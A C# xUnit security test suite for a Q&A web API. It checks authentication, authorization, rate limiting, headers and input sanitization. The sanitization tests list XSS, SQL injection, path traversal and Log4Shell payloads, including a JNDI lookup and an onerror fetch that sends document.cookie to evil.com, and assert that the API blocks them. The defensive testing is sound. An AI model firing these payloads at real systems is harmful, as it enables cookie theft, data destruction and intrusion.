using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc.Testing;
using Xunit;
using Xunit.Abstractions;

namespace WebAPI.IntegrationTests
{
    /// <summary>
    /// Comprehensive security testing for QA System Integration
    /// Tests authentication, authorization, input sanitization, XSS protection, and rate limiting
    /// Validates: Security requirements across all QA endpoints
    /// </summary>
    public class QASecurityTests : BaseIntegrationTest
    {
        private readonly ITestOutputHelper _output;

        public QASecurityTests(WebApplicationFactory<Program> factory, ITestOutputHelper output) 
            : base(factory)
        {
            _output = output;
        }

        #region Authentication Tests

        [Fact]
        public async Task QAEndpoints_WithoutAuthentication_ShouldReturnUnauthorized()
        {
            _output.WriteLine("Testing QA endpoints without authentication...");

            var protectedEndpoints = new[]
            {
                "/api/v7/qa/questions",
                "/api/v7/qa/questions/search",
                "/api/v7/qa/answers",
                "/api/v7/qa/voting",
                "/api/v7/qa/reputation/user/123e4567-e89b-12d3-a456-426614174000"
            };

            foreach (var endpoint in protectedEndpoints)
            {
                // Clear any existing authorization headers
                Client.DefaultRequestHeaders.Authorization = null;

                var response = await Client.GetAsync(endpoint);
                
                Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
                _output.WriteLine($"✓ {endpoint} correctly returns 401 Unauthorized");
            }
        }

        [Fact]
        public async Task QAEndpoints_WithInvalidToken_ShouldReturnUnauthorized()
        {
            _output.WriteLine("Testing QA endpoints with invalid tokens...");

            var invalidTokens = new[]
            {
                "invalid.token.here",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
                "",
                "Bearer malformed",
                "expired.jwt.token"
            };

            var endpoint = "/api/v7/qa/questions";

            foreach (var invalidToken in invalidTokens)
            {
                Client.DefaultRequestHeaders.Authorization = 
                    new AuthenticationHeaderValue("Bearer", invalidToken);

                var response = await Client.GetAsync(endpoint);
                
                Assert.True(response.StatusCode == HttpStatusCode.Unauthorized || 
                           response.StatusCode == HttpStatusCode.Forbidden);
                _output.WriteLine($"✓ Invalid token '{invalidToken.Substring(0, Math.Min(10, invalidToken.Length))}...' correctly rejected");
            }

            // Clean up
            Client.DefaultRequestHeaders.Authorization = null;
        }

        [Fact]
        public async Task QAEndpoints_WithValidAuthentication_ShouldAllowAccess()
        {
            _output.WriteLine("Testing QA endpoints with valid authentication...");

            // Use the test authentication configured in BaseIntegrationTest
            var response = await Client.GetAsync("/api/v7/qa/questions");
            
            Assert.True(response.StatusCode == HttpStatusCode.OK || 
                       response.StatusCode == HttpStatusCode.NoContent);
            _output.WriteLine("✓ Valid authentication allows access to QA endpoints");
        }

        #endregion

        #region Authorization Tests

        [Fact]
        public async Task AdminOnlyEndpoints_WithRegularUser_ShouldReturnForbidden()
        {
            _output.WriteLine("Testing admin-only endpoints with regular user...");

            var adminEndpoints = new[]
            {
                "/api/v7/qa/reputation/users/123e4567-e89b-12d3-a456-426614174000/badges",
                "/api/v7/qa/reputation/statistics"
            };

            foreach (var endpoint in adminEndpoints)
            {
                var badgeRequest = new
                {
                    BadgeName = "Test Badge",
                    Reason = "Testing"
                };

                var response = await Client.PostAsJsonAsync(endpoint, badgeRequest);
                
                Assert.True(response.StatusCode == HttpStatusCode.Forbidden || 
                           response.StatusCode == HttpStatusCode.Unauthorized);
                _output.WriteLine($"✓ {endpoint} correctly restricts access for regular users");
            }
        }

        [Fact]
        public async Task UserSpecificEndpoints_WithDifferentUser_ShouldRestrictAccess()
        {
            _output.WriteLine("Testing user-specific endpoint access restrictions...");

            // Test accessing another user's private data
            var otherUserId = Guid.NewGuid();
            var endpoint = $"/api/v7/qa/reputation/user/{otherUserId}";

            var response = await Client.GetAsync(endpoint);
            
            // Should either be forbidden or return limited public data only
            Assert.True(response.IsSuccessStatusCode || 
                       response.StatusCode == HttpStatusCode.Forbidden ||
                       response.StatusCode == HttpStatusCode.NotFound);
            
            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                // Verify that sensitive data is not exposed
                Assert.DoesNotContain("private", content.ToLower());
                Assert.DoesNotContain("email", content.ToLower());
            }

            _output.WriteLine("✓ User-specific endpoints properly restrict access");
        }

        #endregion

        #region Input Sanitization Tests

        [Fact]
        public async Task CreateQuestion_WithXSSPayload_ShouldSanitizeInput()
        {
            _output.WriteLine("Testing XSS protection in question creation...");

            var xssPayloads = new[]
            {
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>",
                "';DROP TABLE Questions;--",
                "<iframe src='javascript:alert(\"xss\")'></iframe>",
                "<<SCRIPT>alert('XSS');//<</SCRIPT>",
                "<BODY ONLOAD=alert('XSS')>"
            };

            foreach (var payload in xssPayloads)
            {
                var request = new
                {
                    Title = $"Test Question {payload}",
                    Content = $"This is a test question with payload: {payload}",
                    Category = "Web Development",
                    Tags = new List<string> { "test", payload }
                };

                var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
                
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    
                    // Verify that dangerous scripts are not present in the response
                    Assert.DoesNotContain("<script", content.ToLower());
                    Assert.DoesNotContain("javascript:", content.ToLower());
                    Assert.DoesNotContain("onerror=", content.ToLower());
                    Assert.DoesNotContain("onload=", content.ToLower());
                    
                    _output.WriteLine($"✓ XSS payload sanitized: {payload.Substring(0, Math.Min(20, payload.Length))}...");
                }
                else
                {
                    // Input validation should reject malicious content
                    Assert.True(response.StatusCode == HttpStatusCode.BadRequest);
                    _output.WriteLine($"✓ XSS payload rejected: {payload.Substring(0, Math.Min(20, payload.Length))}...");
                }
            }
        }

        [Fact]
        public async Task CreateAnswer_WithSQLInjectionPayload_ShouldRejectOrSanitize()
        {
            _output.WriteLine("Testing SQL injection protection in answer creation...");

            var sqlInjectionPayloads = new[]
            {
                "'; DROP TABLE Answers; --",
                "' OR '1'='1",
                "1; DELETE FROM Questions WHERE 1=1; --",
                "' UNION SELECT * FROM Users --",
                "'; INSERT INTO Answers (Content) VALUES ('hacked'); --",
                "' OR 1=1 /*",
                "admin'--",
                "' OR 'x'='x"
            };

            // First create a question to answer
            var questionRequest = new
            {
                Title = "Test Question for SQL Injection",
                Content = "This is a test question",
                Category = "Database Design",
                Tags = new List<string> { "test" }
            };

            var questionResponse = await Client.PostAsJsonAsync("/api/v7/qa/questions", questionRequest);
            Assert.True(questionResponse.IsSuccessStatusCode);

            var questionContent = await questionResponse.Content.ReadAsStringAsync();
            var questionData = JsonSerializer.Deserialize<JsonElement>(questionContent);
            var questionId = questionData.GetProperty("data").GetProperty("id").GetGuid();

            foreach (var payload in sqlInjectionPayloads)
            {
                var answerRequest = new
                {
                    QuestionId = questionId,
                    Content = $"This is an answer with SQL injection: {payload}"
                };

                var response = await Client.PostAsJsonAsync("/api/v7/qa/answers", answerRequest);
                
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    
                    // Verify that SQL injection patterns are sanitized
                    Assert.DoesNotContain("DROP TABLE", content.ToUpper());
                    Assert.DoesNotContain("DELETE FROM", content.ToUpper());
                    Assert.DoesNotContain("UNION SELECT", content.ToUpper());
                    
                    _output.WriteLine($"✓ SQL injection payload sanitized: {payload.Substring(0, Math.Min(20, payload.Length))}...");
                }
                else
                {
                    // Input validation should reject malicious content
                    Assert.True(response.StatusCode == HttpStatusCode.BadRequest);
                    _output.WriteLine($"✓ SQL injection payload rejected: {payload.Substring(0, Math.Min(20, payload.Length))}...");
                }
            }
        }

        [Fact]
        public async Task SearchQuestions_WithMaliciousInput_ShouldSanitizeOrReject()
        {
            _output.WriteLine("Testing search input sanitization...");

            var maliciousSearchTerms = new[]
            {
                "<script>alert('search xss')</script>",
                "'; DROP TABLE Questions; --",
                "../../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}",
                "%3Cscript%3Ealert('xss')%3C/script%3E",
                "javascript:void(0)",
                "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>"
            };

            foreach (var searchTerm in maliciousSearchTerms)
            {
                var encodedTerm = Uri.EscapeDataString(searchTerm);
                var response = await Client.GetAsync($"/api/v7/qa/questions/search?searchTerm={encodedTerm}");
                
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    
                    // Verify that dangerous content is not reflected in the response
                    Assert.DoesNotContain("<script", content.ToLower());
                    Assert.DoesNotContain("javascript:", content.ToLower());
                    Assert.DoesNotContain("drop table", content.ToLower());
                    
                    _output.WriteLine($"✓ Malicious search term sanitized: {searchTerm.Substring(0, Math.Min(20, searchTerm.Length))}...");
                }
                else
                {
                    // Search should handle malicious input gracefully
                    Assert.True(response.StatusCode == HttpStatusCode.BadRequest || 
                               response.StatusCode == HttpStatusCode.UnprocessableEntity);
                    _output.WriteLine($"✓ Malicious search term rejected: {searchTerm.Substring(0, Math.Min(20, searchTerm.Length))}...");
                }
            }
        }

        #endregion

        #region Rate Limiting Tests

        [Fact]
        public async Task QAEndpoints_WithExcessiveRequests_ShouldApplyRateLimit()
        {
            _output.WriteLine("Testing rate limiting on QA endpoints...");

            var endpoint = "/api/v7/qa/questions";
            var requestCount = 0;
            var rateLimitHit = false;

            // Make rapid requests to trigger rate limiting
            for (int i = 0; i < 150; i++) // Exceed typical rate limit of 100 requests
            {
                var response = await Client.GetAsync(endpoint);
                requestCount++;

                if (response.StatusCode == HttpStatusCode.TooManyRequests)
                {
                    rateLimitHit = true;
                    
                    // Verify rate limit headers are present
                    Assert.True(response.Headers.Contains("X-RateLimit-Limit"));
                    Assert.True(response.Headers.Contains("X-RateLimit-Remaining"));
                    Assert.True(response.Headers.Contains("Retry-After"));
                    
                    _output.WriteLine($"✓ Rate limit triggered after {requestCount} requests");
                    break;
                }

                // Small delay to avoid overwhelming the test system
                if (i % 10 == 0)
                {
                    await Task.Delay(10);
                }
            }

            // Rate limiting should eventually kick in
            Assert.True(rateLimitHit || requestCount >= 100, 
                "Rate limiting should be applied after excessive requests");
        }

        [Fact]
        public async Task VotingEndpoint_WithRapidVoting_ShouldPreventAbuse()
        {
            _output.WriteLine("Testing vote spam prevention...");

            // First create a question to vote on
            var questionRequest = new
            {
                Title = "Test Question for Vote Spam",
                Content = "This is a test question for vote spam testing",
                Category = "Web Development",
                Tags = new List<string> { "test" }
            };

            var questionResponse = await Client.PostAsJsonAsync("/api/v7/qa/questions", questionRequest);
            Assert.True(questionResponse.IsSuccessStatusCode);

            var questionContent = await questionResponse.Content.ReadAsStringAsync();
            var questionData = JsonSerializer.Deserialize<JsonElement>(questionContent);
            var questionId = questionData.GetProperty("data").GetProperty("id").GetGuid();

            // Attempt rapid voting
            var voteRequest = new
            {
                ContentId = questionId,
                ContentType = "Question",
                VoteType = "Up"
            };

            var voteCount = 0;
            var abusePreventionTriggered = false;

            for (int i = 0; i < 20; i++)
            {
                var response = await Client.PostAsJsonAsync("/api/v7/qa/voting", voteRequest);
                voteCount++;

                if (response.StatusCode == HttpStatusCode.TooManyRequests ||
                    response.StatusCode == HttpStatusCode.BadRequest)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    if (content.Contains("already voted") || content.Contains("rate limit"))
                    {
                        abusePreventionTriggered = true;
                        _output.WriteLine($"✓ Vote abuse prevention triggered after {voteCount} attempts");
                        break;
                    }
                }

                await Task.Delay(50); // Small delay between votes
            }

            Assert.True(abusePreventionTriggered, 
                "Vote abuse prevention should trigger for rapid voting attempts");
        }

        #endregion

        #region CSRF Protection Tests

        [Fact]
        public async Task QAEndpoints_WithoutCSRFToken_ShouldStillWork()
        {
            _output.WriteLine("Testing CSRF protection (API should use JWT, not cookies)...");

            // For API endpoints using JWT tokens, CSRF protection is typically not needed
            // as the token is sent in headers, not cookies
            var request = new
            {
                Title = "CSRF Test Question",
                Content = "Testing CSRF protection",
                Category = "Web Development",
                Tags = new List<string> { "test", "csrf" }
            };

            var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
            
            // Should work fine with JWT authentication
            Assert.True(response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.BadRequest);
            _output.WriteLine("✓ JWT-based API correctly handles requests without CSRF tokens");
        }

        #endregion

        #region Security Headers Tests

        [Fact]
        public async Task QAEndpoints_ShouldIncludeSecurityHeaders()
        {
            _output.WriteLine("Testing security headers in QA responses...");

            var response = await Client.GetAsync("/api/v7/qa/questions");
            
            // Check for important security headers
            var headers = response.Headers.Concat(response.Content.Headers);
            var headerDict = headers.ToDictionary(h => h.Key, h => string.Join(", ", h.Value));

            // X-Frame-Options
            if (headerDict.ContainsKey("X-Frame-Options"))
            {
                Assert.Contains("DENY", headerDict["X-Frame-Options"]);
                _output.WriteLine("✓ X-Frame-Options header present");
            }

            // X-Content-Type-Options
            if (headerDict.ContainsKey("X-Content-Type-Options"))
            {
                Assert.Contains("nosniff", headerDict["X-Content-Type-Options"]);
                _output.WriteLine("✓ X-Content-Type-Options header present");
            }

            // X-XSS-Protection
            if (headerDict.ContainsKey("X-XSS-Protection"))
            {
                _output.WriteLine("✓ X-XSS-Protection header present");
            }

            // Content-Security-Policy
            if (headerDict.ContainsKey("Content-Security-Policy"))
            {
                _output.WriteLine("✓ Content-Security-Policy header present");
            }

            _output.WriteLine("Security headers validation completed");
        }

        #endregion

        #region Data Validation Tests

        [Fact]
        public async Task CreateQuestion_WithInvalidData_ShouldReturnValidationErrors()
        {
            _output.WriteLine("Testing data validation in question creation...");

            var invalidRequests = new[]
            {
                new { Title = "", Content = "Valid content", Category = "Web Development", Tags = new List<string> { "test" } },
                new { Title = "Valid title", Content = "", Category = "Web Development", Tags = new List<string> { "test" } },
                new { Title = "Valid title", Content = "Valid content", Category = "", Tags = new List<string> { "test" } },
                new { Title = new string('a', 301), Content = "Valid content", Category = "Web Development", Tags = new List<string> { "test" } }, // Title too long
                new { Title = "Valid title", Content = "Short", Category = "Web Development", Tags = new List<string> { "test" } }, // Content too short
                new { Title = "Valid title", Content = "Valid content", Category = "Web Development", Tags = new List<string> { "tag1", "tag2", "tag3", "tag4", "tag5", "tag6" } } // Too many tags
            };

            foreach (var request in invalidRequests)
            {
                var response = await Client.PostAsJsonAsync("/api/v7/qa/questions", request);
                
                Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
                
                var content = await response.Content.ReadAsStringAsync();
                Assert.Contains("validation", content.ToLower());
                
                _output.WriteLine($"✓ Invalid request properly rejected with validation error");
            }
        }

        [Fact]
        public async Task CreateAnswer_WithInvalidData_ShouldReturnValidationErrors()
        {
            _output.WriteLine("Testing data validation in answer creation...");

            var invalidRequests = new[]
            {
                new { QuestionId = Guid.Empty, Content = "Valid content" },
                new { QuestionId = Guid.NewGuid(), Content = "" },
                new { QuestionId = Guid.NewGuid(), Content = "Short" }, // Content too short
                new { QuestionId = Guid.NewGuid(), Content = new string('a', 10001) } // Content too long
            };

            foreach (var request in invalidRequests)
            {
                var response = await Client.PostAsJsonAsync("/api/v7/qa/answers", request);
                
                Assert.True(response.StatusCode == HttpStatusCode.BadRequest || 
                           response.StatusCode == HttpStatusCode.NotFound);
                
                _output.WriteLine($"✓ Invalid answer request properly rejected");
            }
        }

        #endregion

        #region File Upload Security Tests

        [Fact]
        public async Task FileUpload_WithMaliciousFile_ShouldBeRejected()
        {
            _output.WriteLine("Testing file upload security (if applicable)...");

            // Note: This test assumes there might be file upload functionality in the future
            // For now, we'll test that non-existent upload endpoints return appropriate errors
            
            var maliciousFileContent = Encoding.UTF8.GetBytes("<script>alert('xss')</script>");
            var content = new MultipartFormDataContent();
            content.Add(new ByteArrayContent(maliciousFileContent), "file", "malicious.html");

            var response = await Client.PostAsync("/api/v7/qa/upload", content);
            
            // Should return 404 (not found) or 405 (method not allowed) since upload isn't implemented
            Assert.True(response.StatusCode == HttpStatusCode.NotFound || 
                       response.StatusCode == HttpStatusCode.MethodNotAllowed ||
                       response.StatusCode == HttpStatusCode.BadRequest);
            
            _output.WriteLine("✓ File upload endpoint properly secured or not exposed");
        }

        #endregion

        #region Session Security Tests

        [Fact]
        public async Task ConcurrentSessions_ShouldBeHandledSecurely()
        {
            _output.WriteLine("Testing concurrent session security...");

            // Create multiple concurrent requests to test session handling
            var tasks = new List<Task<HttpResponseMessage>>();
            
            for (int i = 0; i < 10; i++)
            {
                tasks.Add(Client.GetAsync("/api/v7/qa/questions"));
            }

            var responses = await Task.WhenAll(tasks);
            
            // All requests should be handled properly without session conflicts
            foreach (var response in responses)
            {
                Assert.True(response.StatusCode == HttpStatusCode.OK || 
                           response.StatusCode == HttpStatusCode.NoContent ||
                           response.StatusCode == HttpStatusCode.TooManyRequests);
            }
            
            _output.WriteLine("✓ Concurrent sessions handled securely");
        }

        #endregion

        #region Error Information Disclosure Tests

        [Fact]
        public async Task ErrorResponses_ShouldNotLeakSensitiveInformation()
        {
            _output.WriteLine("Testing error information disclosure...");

            // Test various error conditions
            var errorEndpoints = new[]
            {
                "/api/v7/qa/questions/00000000-0000-0000-0000-000000000000", // Non-existent question
                "/api/v7/qa/answers/00000000-0000-0000-0000-000000000000", // Non-existent answer
                "/api/v7/qa/reputation/user/00000000-0000-0000-0000-000000000000" // Non-existent user
            };

            foreach (var endpoint in errorEndpoints)
            {
                var response = await Client.GetAsync(endpoint);
                
                if (!response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    
                    // Verify that sensitive information is not leaked
                    Assert.DoesNotContain("stack trace", content.ToLower());
                    Assert.DoesNotContain("exception", content.ToLower());
                    Assert.DoesNotContain("sql", content.ToLower());
                    Assert.DoesNotContain("database", content.ToLower());
                    Assert.DoesNotContain("connection string", content.ToLower());
                    Assert.DoesNotContain("password", content.ToLower());
                    
                    _output.WriteLine($"✓ Error response for {endpoint} does not leak sensitive information");
                }
            }
        }

        #endregion
    }
}